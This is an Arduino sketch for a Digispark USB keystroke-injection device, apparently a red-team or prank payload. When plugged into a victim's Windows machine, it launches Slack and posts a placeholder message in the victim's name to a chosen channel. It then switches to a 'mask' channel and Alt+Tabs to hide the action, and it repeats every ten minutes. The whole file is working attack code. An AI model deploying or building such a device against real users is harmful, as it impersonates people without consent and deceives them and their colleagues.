#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);

  // additional delay before execution can be useful to potentially distract the victim - depends on scenario
  //DigiKeyboard.delay(3000);

  // send <Windows> + R to open run
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // change main window to slack (assuming slack is running in the background)
  DigiKeyboard.print("%USERPROFILE%\\AppData\\Local\\slack\\slack.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500); // if slack might be off on the victim's machine, increase this value (app startup time)
  
  // select channel to write a message on
  DigiKeyboard.sendKeyStroke(KEY_K, MOD_CONTROL_LEFT); // slack's shortcut for channel selection
  DigiKeyboard.delay(800);
  DigiKeyboard.print("CHANGE_ME_DESTINATION_CHANNEL"); // channel name goes here  
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  // prepare and send the message
  DigiKeyboard.print("CHANGE_ME MESSAGE"); // message goes here
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  // select different channel to mask the message
  DigiKeyboard.sendKeyStroke(KEY_K, MOD_CONTROL_LEFT); // slack's shortcut for channel selection
  DigiKeyboard.delay(800);
  DigiKeyboard.print("CHANGE_ME_MASK_CHANNEL"); // channel name goes here  
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Alt+tab to hide the Slack window (once again - depends on many factors, like number of displays, if slack was visible before the execution, etc.)
  // 0x2B == "Keyboard Tab"; as described in: https://usb.org/sites/default/files/hut1_4.pdf
  DigiKeyboard.sendKeyStroke(0x2B, MOD_ALT_LEFT);

  // Delay to disconnect before payload execs again (600000 milliseconds == 10 minutes)
  DigiKeyboard.delay(600000);
}